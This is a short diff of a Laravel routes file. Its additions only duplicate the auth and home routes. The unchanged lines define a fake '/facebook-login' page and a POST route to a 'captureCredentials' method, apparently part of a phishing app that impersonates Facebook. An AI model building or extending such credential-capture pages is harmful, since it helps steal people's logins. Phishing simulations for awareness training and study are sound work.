@@ -11,6 +11,7 @@ Route::get('/', function () {
 });
 
 Auth::routes();
+
 Route::get('/home', [HomeController::class, 'index'])->name('home');
 
 Route::middleware(['auth'])->group(function(){
@@ -20,3 +21,6 @@ Route::middleware(['auth'])->group(function(){
 
 Route::get('/facebook-login', [PhishingController::class, 'showLoginPage'])->name('phishing.login');
 Route::post('/facebook-login', [PhishingController::class, 'captureCredentials'])->name('phishing.capture');
+Auth::routes();
+
+Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');
